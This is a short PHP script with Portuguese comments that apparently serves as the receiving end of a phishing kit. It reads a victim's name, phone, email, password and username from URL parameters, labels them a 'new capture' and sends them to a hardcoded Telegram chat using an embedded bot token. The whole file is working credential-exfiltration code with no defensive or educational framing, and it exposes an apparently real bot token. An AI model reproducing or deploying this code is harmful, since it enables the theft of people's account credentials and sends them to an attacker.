<?php
// Verifica se todos os parâmetros necessários estão presentes
if (isset($_GET['name'], $_GET['tel'], $_GET['email'], $_GET['pass'], $_GET['user'])) {
    
    // Captura os parâmetros com segurança básica
    $name  = htmlspecialchars($_GET['name']);
    $tel   = htmlspecialchars($_GET['tel']);
    $email = htmlspecialchars($_GET['email']);
    $pass  = htmlspecialchars($_GET['pass']);
    $user  = htmlspecialchars($_GET['user']);

    // Corrige o fuso horário manualmente (-3 horas)
    $horaCorrigida = date("H:i:s", strtotime("-3 hours"));
    $dataAtual = date("d/m/Y");

    // Cria a mensagem com emojis e formatação bonitinha
    $mensagem = "🔥 *Nova Captura Recebida!* 🔥\n\n"
              . "👤 *Nome:* $name\n"
              . "📱 *Telefone:* $tel\n"
              . "✉️ *Email:* $email\n"
              . "🔐 *Senha:* $pass\n"
              . "🧑‍💻 *Usuário:* $user\n\n"
              . "⌚ _Hora:_ $horaCorrigida\n"
              . "📅 _Data:_ $dataAtual";

    // Dados da API do Telegram
    $token = "7114885129:AAHb9cKEsktZ2Da1AAjdzrdxcCNtVCCKDG4";
    $chat_id = "-1002475362928";
    $url = "https://api.telegram.org/bot$token/sendMessage";

    // Envia a mensagem via Telegram
    $response = file_get_contents($url . "?chat_id=$chat_id&text=" . urlencode($mensagem) . "&parse_mode=Markdown");

    // Exibe mensagem de sucesso
    echo "Mensagem enviada com sucesso!";
} else {
    echo "Parâmetros ausentes!";
}
?>
